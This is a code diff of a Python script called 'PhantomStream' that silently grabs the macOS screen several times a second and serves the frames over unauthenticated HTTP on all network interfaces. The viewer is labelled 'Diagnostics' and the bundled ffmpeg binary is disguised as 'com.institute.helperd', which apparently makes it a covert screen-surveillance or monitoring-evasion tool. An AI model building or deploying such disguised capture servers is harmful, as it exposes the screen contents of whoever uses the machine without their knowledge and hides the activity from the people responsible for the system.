@@ -1,116 +1,83 @@
 #!/usr/bin/env python3
 """
-PhantomStream v1.0 — HTTP JPEG Frame Server
+PhantomStream v1.0 — File-based Frame Server (Grok-validated architecture)
+
+Architecture (eliminates pipe starvation at nice -n 19):
+  ffmpeg -update 1 → /tmp/ps_frame.jpg   (overwrites file each frame)
+  Python reads file per /frame request    (no pipe, no thread, no deadlock)
+  JS setTimeout recursion updates tablet  (no setInterval skip problem)
+
 Endpoints:
-  GET /        → HTML viewer with JS polling (works on Chrome Android)
-  GET /frame   → latest JPEG frame (called by JS every 250ms)
-  GET /stream  → legacy MJPEG multipart (kept for desktop VLC/ffplay)
+  GET /        → HTML viewer with JS polling
+  GET /frame   → latest JPEG from file (served fresh per request)
+  GET /health  → JSON status for monitoring
 """
 
 import os
-import queue
+import sys
 import signal
 import socket
 import subprocess
 import threading
-import sys
 import time
+import json
 
-INSTALL_DIR = os.path.dirname(os.path.abspath(__file__))
-FFMPEG      = os.path.join(INSTALL_DIR, "com.institute.helperd")
-LOG_FILE    = os.path.join(INSTALL_DIR, "stream.log")
-PID_FILE    = os.path.join(INSTALL_DIR, "stream.pid")
-FPID_FILE   = os.path.join(INSTALL_DIR, "ffmpeg.pid")
-PORT        = 49213
+INSTALL_DIR  = os.path.dirname(os.path.abspath(__file__))
+FFMPEG       = os.path.join(INSTALL_DIR, "com.institute.helperd")
+LOG_FILE     = os.path.join(INSTALL_DIR, "stream.log")
+PID_FILE     = os.path.join(INSTALL_DIR, "stream.pid")
+FPID_FILE    = os.path.join(INSTALL_DIR, "ffmpeg.pid")
+FRAME_FILE   = "/tmp/ps_frame.jpg"   # ffmpeg writes here; Python reads here
+PORT         = 49213
 
-# ── Shared latest frame (updated by broadcaster, read by /frame requests) ─────
-_latest_frame:      bytes          = b""
-_latest_frame_lock: threading.Lock = threading.Lock()
-
-# ── MJPEG multipart clients (kept for legacy support) ─────────────────────────
-_clients:      list = []
-_clients_lock: threading.Lock = threading.Lock()
-
-# ── HTML page: JS polls /frame every 250ms → works on all Chrome versions ─────
-HTML = b"""<!DOCTYPE html>
+# ── HTML: setTimeout recursion — fires next fetch only AFTER previous completes
+# This prevents the setInterval skip-frame problem when fetch takes >interval ms
+HTML = """<!DOCTYPE html>
 <html>
 <head>
   <meta name="viewport" content="width=device-width,initial-scale=1">
-  <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
   <title>Diagnostics</title>
   <style>
     * { margin:0; padding:0; box-sizing:border-box }
     body { background:#000; width:100vw; height:100vh;
            display:flex; align-items:center; justify-content:center }
-    img { max-width:100%; max-height:100vh; object-fit:contain }
+    img  { max-width:100%; max-height:100vh; object-fit:contain }
   </style>
 </head>
 <body>
   <img id="f" src="/frame">
   <script>
-    var img = document.getElementById('f');
-    var ok = true;
-    function next() {
-      if (!ok) return;
-      var i = new Image();
-      i.onload = function() { img.src = i.src; ok = true; };
-      i.onerror = function() { ok = true; };
-      ok = false;
-      i.src = '/frame?' + Date.now();
+    var el = document.getElementById('f');
+    var INTERVAL = 200;   /* ms between frame fetches — lower = smoother */
+    var RETRY    = 500;   /* ms to wait after an error */
+
+    function fetchNext() {
+      var img = new Image();
+      img.onload = function() {
+        el.src = img.src;              /* swap only on successful load */
+        setTimeout(fetchNext, INTERVAL);
+      };
+      img.onerror = function() {
+        setTimeout(fetchNext, RETRY);  /* back off on error */
+      };
+      img.src = '/frame?' + Date.now();  /* cache-bust each request */
     }
-    setInterval(next, 250);
+
+    /* Start after first image renders so tablet shows something immediately */
+    el.onload  = function() { fetchNext(); };
+    el.onerror = function() { setTimeout(fetchNext, RETRY); };
   </script>
 </body>
 </html>"""
-
-
-def _broadcast_frames(proc: subprocess.Popen) -> None:
-    """Parse JPEG frames from ffmpeg pipe; store latest + push to MJPEG clients."""
-    global _latest_frame
-    buf = b""
-    SOI = b"\xff\xd8"
-    EOI = b"\xff\xd9"
-
-    while True:
-        chunk = proc.stdout.read(32768)  # type: ignore[union-attr]
-        if not chunk:
-            break
-        buf += chunk
-
-        while True:
-            s = buf.find(SOI)
-            if s == -1:
-                buf = b""
-                break
-            e = buf.find(EOI, s + 2)
-            if e == -1:
-                buf = buf[s:]
-                break
-
-            frame = buf[s : e + 2]
-            buf   = buf[e + 2:]
-
-            # Store as latest frame for /frame polling
-            with _latest_frame_lock:
-                _latest_frame = frame
-
-            # Push to any MJPEG multipart clients
-            with _clients_lock:
-                for q in list(_clients):
-                    if q.full():
-                        try: q.get_nowait()
-                        except queue.Empty: pass
-                    try: q.put_nowait(frame)
-                    except queue.Full: pass
+HTML = HTML.encode()
 
 
 def _serve_frame(conn: socket.socket) -> None:
-    """Return the latest JPEG frame as a single HTTP response."""
-    with _latest_frame_lock:
-        frame = _latest_frame
-
-    if not frame:
-        # No frame yet — return 503
+    """Read latest JPEG from file and serve it. No pipe, no lock, no thread."""
+    try:
+        with open(FRAME_FILE, "rb") as fh:
+            frame = fh.read()
+    except (FileNotFoundError, OSError):
         conn.sendall(
             b"HTTP/1.1 503 Service Unavailable\r\n"
             b"Retry-After: 1\r\nConnection: close\r\n\r\n"
@@ -131,45 +98,27 @@ def _serve_frame(conn: socket.socket) -> None:
     conn.close()
 
 
-def _serve_stream(conn: socket.socket) -> None:
-    """Legacy MJPEG multipart stream — kept for desktop VLC/ffplay."""
-    q: queue.Queue = queue.Queue(maxsize=2)
-    with _clients_lock:
-        _clients.append(q)
-
+def _serve_health(conn: socket.socket) -> None:
+    """JSON health — frame age is the only signal (screencapture, no ffmpeg PID)."""
+    frame_age = -1
     try:
-        conn.sendall(
-            b"HTTP/1.1 200 OK\r\n"
-            b"Content-Type: multipart/x-mixed-replace;boundary=phantomframe\r\n"
-            b"Cache-Control: no-cache\r\nConnection: keep-alive\r\n\r\n"
-        )
-        conn.settimeout(2.0)
-
-        while True:
-            try:
-                frame = q.get(timeout=10)
-            except queue.Empty:
-                continue
-
-            header = (
-                b"--phantomframe\r\nContent-Type: image/jpeg\r\n"
-                b"Content-Length: " + str(len(frame)).encode() + b"\r\n\r\n"
-            )
-            try:
-                conn.sendall(header + frame + b"\r\n")
-            except (socket.timeout, OSError):
-                try:
-                    while True: q.get_nowait()
-                except queue.Empty:
-                    pass
-    except (BrokenPipeError, ConnectionResetError, OSError):
+        frame_age = round(time.time() - os.path.getmtime(FRAME_FILE), 2)
+    except OSError:
         pass
-    finally:
-        with _clients_lock:
-            if q in _clients:
-                _clients.remove(q)
-        try: conn.close()
-        except: pass
+
+    payload = json.dumps({
+        "status":      "ok" if 0 <= frame_age < 2.0 else "degraded",
+        "frame_age_s": frame_age,
+    }).encode()
+
+    conn.sendall(
+        b"HTTP/1.1 200 OK\r\n"
+        b"Content-Type: application/json\r\n"
+        b"Content-Length: " + str(len(payload)).encode() + b"\r\n"
+        b"Connection: close\r\n\r\n"
+        + payload
+    )
+    conn.close()
 
 
 def _handle_client(conn: socket.socket) -> None:
@@ -187,8 +136,8 @@ def _handle_client(conn: socket.socket) -> None:
 
         if path == "/frame":
             _serve_frame(conn)
-        elif path == "/stream":
-            _serve_stream(conn)
+        elif path == "/health":
+            _serve_health(conn)
         else:
             conn.sendall(
                 b"HTTP/1.1 200 OK\r\n"
@@ -202,45 +151,61 @@ def _handle_client(conn: socket.socket) -> None:
         except: pass
 
 
+def _capture_loop(log_fh) -> None:
+    """Capture screen every 333ms using screencapture.
+    No persistent avfoundation session = no TCC stale-frame bug.
+    Each call is a fresh system-level grab of the current display.
+    """
+    tmp = FRAME_FILE + ".tmp"
+    while True:
+        try:
+            r = subprocess.run(
+                ["screencapture", "-x", "-t", "jpg", tmp],
+                capture_output=True, timeout=4
+            )
+            if r.returncode == 0 and os.path.getsize(tmp) > 0:
+                os.replace(tmp, FRAME_FILE)  # atomic — no torn reads
+            else:
+                log_fh.write(f"[capture] screencapture failed rc={r.returncode} {r.stderr}\n")
+                log_fh.flush()
+        except Exception as e:
+            log_fh.write(f"[capture] error: {e}\n")
+            log_fh.flush()
+        time.sleep(0.333)
+
+
 def main() -> None:
     with open(PID_FILE, "w") as fh:
         fh.write(str(os.getpid()))
 
-    # Full resolution + quality — USB handles the bandwidth easily
-    cmd = [
-        FFMPEG,
-        "-f",            "avfoundation",
-        "-framerate",    "4",
-        "-video_size",   "1280x800",       # MacBook Air 2017 native res
-        "-pixel_format", "uyvy422",
-        "-i",            "1",
-        "-vf",           "scale=1280:800:flags=fast_bilinear",
-        "-c:v",          "mjpeg",
-        "-q:v",          "4",              # high quality — USB has bandwidth
-        "-threads",      "2",
-        "-f",            "mjpeg",
-        "-loglevel",     "error",
-        "pipe:1",
-    ]
+    try: os.remove(FRAME_FILE)
+    except FileNotFoundError: pass
 
     log_fh = open(LOG_FILE, "a")
-    proc   = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=log_fh,
-                               bufsize=0)
-
-    with open(FPID_FILE, "w") as fh:
-        fh.write(str(proc.pid))
 
     def _cleanup(signum=None, frame=None) -> None:
-        proc.terminate()
         try: log_fh.close()
+        except: pass
+        try: os.remove(FRAME_FILE)
         except: pass
         sys.exit(0)
 
     signal.signal(signal.SIGTERM, _cleanup)
     signal.signal(signal.SIGINT,  _cleanup)
 
-    threading.Thread(target=_broadcast_frames, args=(proc,), daemon=True).start()
+    # screencapture loop — fresh grab every 333ms, no avfoundation session
+    threading.Thread(target=_capture_loop, args=(log_fh,), daemon=True).start()
 
+    # ── Wait for first frame before accepting connections ─────────────────────
+    deadline = time.time() + 10
+    while not os.path.exists(FRAME_FILE):
+        if time.time() > deadline:
+            print("[server] ffmpeg did not produce first frame in 10s — check log",
+                  flush=True)
+            break
+        time.sleep(0.2)
+
+    # ── HTTP server ───────────────────────────────────────────────────────────
     srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
     srv.bind(("0.0.0.0", PORT))
@@ -249,7 +214,11 @@ def main() -> None:
     while True:
         try:
             conn, _ = srv.accept()
-            threading.Thread(target=_handle_client, args=(conn,), daemon=True).start()
+            threading.Thread(
+                target=_handle_client,
+                args=(conn,),
+                daemon=True
+            ).start()
         except OSError:
             break
 
